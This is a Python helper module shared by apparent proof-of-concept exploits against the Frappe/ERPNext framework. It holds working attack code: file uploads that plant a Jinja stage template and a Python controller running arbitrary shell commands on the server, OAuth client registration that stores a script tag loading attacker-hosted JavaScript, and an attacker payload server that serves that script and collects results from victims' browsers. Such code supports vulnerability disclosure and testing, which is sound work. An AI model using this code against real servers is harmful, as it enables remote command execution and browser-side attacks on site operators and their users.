#!/usr/bin/env python3
"""Small shared helpers for the FRAPPE-02, FRAPPE-03 and FRAPPE-04 PoCs."""

from __future__ import annotations

import argparse
import base64
import binascii
import getpass
import http.cookiejar
import json
import os
import re
import secrets
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path


REGISTER = "/api/method/frappe.integrations.oauth2.register_client"
AUTHORIZE = "/api/method/frappe.integrations.oauth2.authorize"
UPLOAD = "/api/method/upload_file"
IMPORT_METHOD = "erpnext.edi.doctype.code_list.code_list_import.import_genericode"
CSRF_RE = re.compile(rb'frappe\.csrf_token\s*=\s*"([^"]+)"')
RESULT_RE = {
    "status": re.compile(rb'<div id="cmd-status">(-?[0-9]+)</div>'),
    "stdout": re.compile(rb'<div id="cmd-stdout">([A-Za-z0-9+/]*={0,2})</div>'),
    "stderr": re.compile(rb'<div id="cmd-stderr">([A-Za-z0-9+/]*={0,2})</div>'),
}


class PocError(RuntimeError):
    pass


# --- terminal UI ---
_BANNER = r"""
 _____ ____      _    ____  ____  _____
|  ___|  _ \    / \  |  _ \|  _ \| ____|
| |_  | |_) |  / _ \ | |_) | |_) |  _|
|  _| |  _ <  / ___ \|  __/|  __/| |___
|_|   |_| \_\/_/   \_\_|   |_|   |_____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color() -> None:
    global _COLOR
    _COLOR = False


def banner(subtitle: str) -> None:
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg: str) -> None:
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg: str) -> None:
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg: str) -> None:
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg: str) -> None:
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def rule() -> None:
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")


def emit_command_result(command_status: int, stdout: bytes, stderr: bytes) -> None:
    """Frame remote command output on stderr, write the bytes to stdout."""
    if command_status == 0:
        good(f"remote command exited with status {command_status}")
    else:
        warn(f"remote command exited with status {command_status}")
    rule()
    sys.stdout.buffer.write(stdout)
    if stdout and not stdout.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.buffer.flush()
    if stderr:
        sys.stderr.buffer.write(stderr)
        if not stderr.endswith(b"\n"):
            sys.stderr.buffer.write(b"\n")
        sys.stderr.buffer.flush()


def add_color_argument(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--no-color", action="store_true", help="disable coloured output")
# --- end terminal UI ---


def tls_context(insecure: bool) -> ssl.SSLContext:
    context = ssl.create_default_context()
    if insecure:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    return context


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ANN001
        return None


def normalize_origin(value: str, label: str = "URL") -> str:
    value = value.strip().rstrip("/")
    try:
        parsed = urllib.parse.urlsplit(value)
        _ = parsed.port
    except ValueError as exc:
        raise PocError(f"invalid {label}: {exc}") from exc
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise PocError(f"{label} must be an HTTP(S) origin")
    if (
        parsed.username
        or parsed.password
        or parsed.path not in {"", "/"}
        or parsed.query
        or parsed.fragment
    ):
        raise PocError(f"{label} must not contain userinfo, a path, query, or fragment")
    return value


def normalize_public_origin(value: str, target: str) -> str:
    public = normalize_origin(value, "public URL")
    if target.startswith("https://") and not public.startswith("https://"):
        raise PocError("an HTTPS target requires an HTTPS --public-url")
    return public


class Client:
    def __init__(
        self,
        url: str,
        timeout: float,
        insecure: bool,
        sid: str | None = None,
    ) -> None:
        self.url = normalize_origin(url, "target URL")
        self.timeout = timeout
        self.sid = clean_sid(sid) if sid else None
        self.cookies = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=tls_context(insecure)),
            urllib.request.HTTPCookieProcessor(self.cookies),
            NoRedirect(),
        )

    def request(
        self,
        path: str,
        *,
        method: str = "GET",
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, bytes]:
        request_headers = {
            "Accept": "application/json",
            "User-Agent": "cryptocat-frappe-poc",
            **(headers or {}),
        }
        if self.sid:
            request_headers["Cookie"] = f"sid={self.sid}"
        request = urllib.request.Request(
            self.url + path,
            data=data,
            headers=request_headers,
            method=method,
        )
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                return int(response.status), response.read()
        except urllib.error.HTTPError as exc:
            return int(exc.code), exc.read()
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            raise PocError(f"request to {request.full_url} failed: {exc}") from exc


def clean_sid(value: str) -> str:
    value = value[4:] if value.startswith("sid=") else value
    if not value or any(char in value for char in "\r\n;"):
        raise PocError("invalid sid cookie value")
    return value


def password_for(explicit: str | None, environment: str) -> str:
    if explicit is not None:
        return explicit
    if password := os.environ.get(environment):
        return password
    if sys.stdin.isatty():
        return getpass.getpass("Frappe password: ")
    raise PocError(f"set --password or {environment}")


def login(client: Client, username: str, password: str) -> None:
    body = urllib.parse.urlencode({"usr": username, "pwd": password}).encode()
    status, raw = client.request(
        "/api/method/login",
        method="POST",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        response = json.loads(raw)
    except (UnicodeDecodeError, json.JSONDecodeError):
        response = {}
    if status != 200 or response.get("message") != "Logged In":
        raise PocError(f"login failed with HTTP {status}")


def csrf_token(client: Client) -> str:
    for path in ("/desk", "/app"):
        status, body = client.request(path, headers={"Accept": "text/html"})
        if status == 200 and (match := CSRF_RE.search(body)):
            return match.group(1).decode("ascii")
    raise PocError("could not extract the authenticated session's CSRF token")


def authenticated_client(args: argparse.Namespace) -> tuple[Client, str]:
    if args.sid and not args.csrf_token:
        raise PocError("--csrf-token is required with --sid")
    client = Client(args.url, args.timeout, args.insecure, args.sid)
    if args.username:
        login(client, args.username, password_for(args.password, args.password_env))
        good(f"authenticated as {args.username}")
        return client, args.csrf_token or csrf_token(client)
    info("using the supplied authenticated session")
    return client, args.csrf_token


def add_auth_arguments(parser: argparse.ArgumentParser, role: str) -> None:
    auth = parser.add_mutually_exclusive_group(required=True)
    auth.add_argument("--username", metavar="USER", help=f"{role} username (logs in for a fresh session)")
    auth.add_argument("--sid", metavar="COOKIE", help="existing authenticated sid cookie (needs --csrf-token)")
    parser.add_argument("--password", metavar="PASS", help="Frappe password (else --password-env, then a prompt)")
    parser.add_argument("--password-env", default="FRAPPE_POC_PASSWORD", metavar="VAR",
                        help="env var holding the password (default: FRAPPE_POC_PASSWORD)")
    parser.add_argument("--csrf-token", metavar="TOKEN", help="CSRF token required with --sid")


def validate_installed_app_www(value: str) -> str:
    value = value.strip().rstrip("/")
    if not value or any(ord(char) < 0x20 or ord(char) == 0x7F for char in value):
        raise PocError("--www-path must be a nonempty path without control characters")
    if "\\" in value:
        raise PocError("--www-path must use POSIX separators")
    if value.rsplit("/", 1)[-1] != "www":
        raise PocError("--www-path must identify an installed app's www directory")
    return value


def fresh_route(prefix: str) -> str:
    if not re.fullmatch(r"[a-z][a-z0-9_]{0,20}", prefix):
        raise PocError("internal route prefix has an invalid shape")
    return prefix + "_" + secrets.token_hex(16)


def route_path(route: str) -> str:
    return "/" + urllib.parse.quote(route, safe="") + "?cb=" + str(time.time_ns())


def require_fresh_http_route(client: Client, route: str) -> None:
    status, _body = client.request(
        route_path(route),
        headers={"Accept": "*/*", "Cache-Control": "no-cache, no-store"},
    )
    if status != 404:
        raise PocError(f"fresh random route /{route} returned HTTP {status}, expected 404")


def multipart(
    fields: list[tuple[str, str]],
    files: list[tuple[str, str, str, bytes]],
) -> tuple[str, bytes]:
    boundary = "----frappe-exploit-" + secrets.token_hex(12)
    body = bytearray()
    for name, value in fields:
        body.extend(f"--{boundary}\r\n".encode())
        body.extend(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode())
        body.extend(value.encode())
        body.extend(b"\r\n")
    for name, filename, content_type, content in files:
        if '"' in filename or any(ord(char) < 0x20 for char in filename):
            raise PocError("multipart filename contains an unsupported character")
        body.extend(f"--{boundary}\r\n".encode())
        body.extend(
            f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
        )
        body.extend(f"Content-Type: {content_type}\r\n\r\n".encode())
        body.extend(content)
        body.extend(b"\r\n")
    body.extend(f"--{boundary}--\r\n".encode())
    return boundary, bytes(body)


def upload_genericode(
    client: Client, csrf: str, remote_path: str, content: bytes
) -> tuple[int, bytes]:
    boundary, body = multipart(
        [("method", IMPORT_METHOD), ("is_private", "1")],
        [("file", remote_path, "application/xml", content)],
    )
    return client.request(
        UPLOAD,
        method="POST",
        data=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "X-Frappe-CSRF-Token": csrf,
        },
    )


def build_controller(command: str) -> bytes:
    return (
        "import base64\n"
        "import subprocess\n\n"
        "no_cache = 1\n\n"
        "def get_context(context):\n"
        f"    result = subprocess.run({command!r}, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
        "    context.cmd_status = result.returncode\n"
        "    context.cmd_stdout = base64.b64encode(result.stdout).decode('ascii')\n"
        "    context.cmd_stderr = base64.b64encode(result.stderr).decode('ascii')\n"
    ).encode()


def build_result_page() -> bytes:
    return (
        "<!-- no-cache -->\n"
        '<div id="cmd-status">{{ cmd_status }}</div>\n'
        '<div id="cmd-stdout">{{ cmd_stdout }}</div>\n'
        '<div id="cmd-stderr">{{ cmd_stderr }}</div>\n'
    ).encode()


def build_stage_template(exec_route: str, www_path: str) -> str:
    destination = www_path + "/" + exec_route
    page_path = json.dumps(destination + ".html")
    controller_path = json.dumps(destination + ".py")
    return (
        "<!-- jinja -->\n"
        "{% if frappe.request.files.get('page') and frappe.request.files.get('controller') %}\n"
        "{{ frappe.request.files.get('page').save(" + page_path + ") }}\n"
        "{{ frappe.request.files.get('controller').save(" + controller_path + ") }}\n"
        "{% endif %}\n"
    )


def parse_command_result(status: int, body: bytes) -> tuple[int, bytes, bytes]:
    matches = {name: pattern.findall(body) for name, pattern in RESULT_RE.items()}
    if status != 200 or any(len(values) != 1 for values in matches.values()):
        raise PocError(f"command route did not return one complete result (HTTP {status})")
    try:
        stdout = base64.b64decode(matches["stdout"][0], validate=True)
        stderr = base64.b64decode(matches["stderr"][0], validate=True)
    except (ValueError, binascii.Error) as exc:
        raise PocError("command route returned invalid base64") from exc
    return int(matches["status"][0]), stdout, stderr


def execute_route(client: Client, route: str) -> tuple[int, bytes, bytes]:
    deadline = time.monotonic() + 5.0
    while True:
        status, body = client.request(
            route_path(route),
            headers={"Accept": "text/html", "Cache-Control": "no-cache, no-store"},
        )
        complete = all(len(pattern.findall(body)) == 1 for pattern in RESULT_RE.values())
        if status not in {404, 500} or complete:
            return parse_command_result(status, body)

        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return parse_command_result(status, body)
        time.sleep(min(0.25, remaining))


def register_oauth_client(
    target: str,
    redirect_uri: str,
    client_name: str,
    timeout: float,
    insecure: bool,
    software_label: str,
) -> tuple[str, str]:
    metadata = {
        "redirect_uris": [redirect_uri],
        "token_endpoint_auth_method": "client_secret_basic",
        "grant_types": ["authorization_code"],
        "response_types": ["code"],
        "client_name": client_name,
        "scope": "all",
        "software_id": software_label + "-" + secrets.token_hex(8),
        "software_version": "1",
    }
    context = tls_context(insecure)
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=context), NoRedirect()
    )
    request = urllib.request.Request(
        target + REGISTER,
        data=json.dumps(metadata, separators=(",", ":")).encode(),
        headers={
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "cryptocat-frappe02-poc",
        },
        method="POST",
    )
    try:
        with opener.open(request, timeout=timeout) as response:
            status, raw = int(response.status), response.read()
    except urllib.error.HTTPError as exc:
        status, raw = int(exc.code), exc.read()
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        raise PocError(f"dynamic registration failed: {exc}") from exc
    try:
        result = json.loads(raw)
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise PocError(f"dynamic registration returned non-JSON HTTP {status}") from exc
    if status != 201 or not isinstance(result, dict) or not result.get("client_id"):
        detail = result.get("error_description") if isinstance(result, dict) else result
        raise PocError(f"dynamic registration failed with HTTP {status}: {detail}")
    if result.get("client_name") != client_name:
        raise PocError("registration response did not preserve the submitted client_name")
    redirects = result.get("redirect_uris")
    if not isinstance(redirects, list) or len(redirects) != 1 or not isinstance(redirects[0], str):
        raise PocError("registration response did not preserve one redirect URI")
    return str(result["client_id"]), redirects[0]


def authorize_url(target: str, redirect_uri: str, client_id: str) -> str:
    query = urllib.parse.urlencode(
        {
            "client_id": client_id,
            "scope": "all",
            "response_type": "code",
            "redirect_uri": redirect_uri,
            "state": secrets.token_urlsafe(18),
        },
        quote_via=urllib.parse.quote,
    )
    return target + AUTHORIZE + "?" + query


def stored_script_tag(script_url: str) -> str:
    tag = f"<script src='{script_url}'></script>"
    stored = json.dumps(tag)
    if len(stored) > 140:
        raise PocError(
            f"stored client_name is {len(stored)} characters; use a shorter --public-url"
        )
    return stored


@dataclass
class PayloadState:
    public_url: str
    token: str = field(default_factory=lambda: secrets.token_urlsafe(18))
    javascript: str = ""
    write_event: threading.Event = field(default_factory=threading.Event)

    @property
    def payload_base(self) -> str:
        return f"{self.public_url}/{self.token}"

    def accept_result(self, body: bytes) -> bool:
        if body != b"written" or self.write_event.is_set():
            return False
        self.write_event.set()
        good("browser completed the authenticated write")
        return True


class PayloadServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, address: tuple[str, int], state: PayloadState):
        self.state = state
        super().__init__(address, PayloadHandler)


class PayloadServerV6(PayloadServer):
    address_family = socket.AF_INET6


class PayloadHandler(BaseHTTPRequestHandler):
    server: PayloadServer

    def log_message(self, _format: str, *_args) -> None:
        return

    def send_body(self, status: int, body: bytes, content_type: str) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def do_GET(self) -> None:  # noqa: N802
        parsed = urllib.parse.urlsplit(self.path)
        prefix = f"/{self.server.state.token}"
        if parsed.path == prefix + "/payload.js":
            good(f"browser loaded the payload from {self.client_address[0]}")
            self.send_body(
                200,
                self.server.state.javascript.encode(),
                "text/javascript; charset=utf-8",
            )
            return
        if parsed.path == prefix + "/callback":
            self.send_body(200, b"OAuth callback reached\n", "text/plain; charset=utf-8")
            return
        self.send_body(404, b"not found\n", "text/plain; charset=utf-8")

    def do_POST(self) -> None:  # noqa: N802
        if urllib.parse.urlsplit(self.path).path != f"/{self.server.state.token}/result":
            self.send_body(404, b"not found\n", "text/plain; charset=utf-8")
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = 0
        if length != 7:
            self.send_body(400, b"invalid result\n", "text/plain; charset=utf-8")
            return
        if not self.server.state.accept_result(self.rfile.read(length)):
            self.send_body(409, b"result rejected\n", "text/plain; charset=utf-8")
            return
        self.send_body(200, b"write result received\n", "text/plain; charset=utf-8")


@dataclass
class RunningPayload:
    state: PayloadState
    server: PayloadServer
    thread: threading.Thread

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=2)


def start_payload_server(
    public_url: str,
    listen_host: str,
    listen_port: int,
    certfile: Path | None,
    keyfile: Path | None,
) -> RunningPayload:
    if not 1 <= listen_port <= 65535:
        raise PocError("--listen-port must be between 1 and 65535")
    if bool(certfile) != bool(keyfile):
        raise PocError("--certfile and --keyfile must be supplied together")
    state = PayloadState(public_url)
    server_class = PayloadServerV6 if ":" in listen_host else PayloadServer
    try:
        server = server_class((listen_host, listen_port), state)
    except OSError as exc:
        raise PocError(f"could not listen on {listen_host}:{listen_port}: {exc}") from exc
    if certfile:
        if not public_url.startswith("https://"):
            server.server_close()
            raise PocError("--certfile requires an HTTPS --public-url")
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        try:
            context.load_cert_chain(certfile, keyfile)
            server.socket = context.wrap_socket(server.socket, server_side=True)
        except (OSError, ssl.SSLError) as exc:
            server.server_close()
            raise PocError(f"could not enable TLS: {exc}") from exc
    elif public_url.startswith("https://"):
        warn("HTTPS public URL assumes a TLS reverse proxy in front of this listener")
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return RunningPayload(state, server, thread)


def add_server_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--public-url", required=True, metavar="URL", help="browser-visible attacker origin (what the victim's browser reaches)")
    parser.add_argument("--listen-host", default="0.0.0.0", metavar="HOST", help="local bind address for the payload server (default: 0.0.0.0)")
    parser.add_argument("--listen-port", type=int, default=8000, metavar="PORT", help="local port for the payload server (default: 8000)")
    parser.add_argument("--certfile", type=Path, metavar="PATH", help="TLS certificate to terminate HTTPS here (omit behind a tunnel/proxy)")
    parser.add_argument("--keyfile", type=Path, metavar="PATH", help="TLS private key; pair with --certfile")
    parser.add_argument("--wait-seconds", type=float, default=300.0, metavar="SECS", help="how long to wait for the victim (default: 300)")


def wait_for_write(payload: RunningPayload, seconds: float) -> None:
    if seconds <= 0:
        raise PocError("--wait-seconds must be greater than zero")
    if not payload.state.write_event.wait(seconds):
        raise PocError(f"the authenticated write did not complete within {seconds:g} seconds")
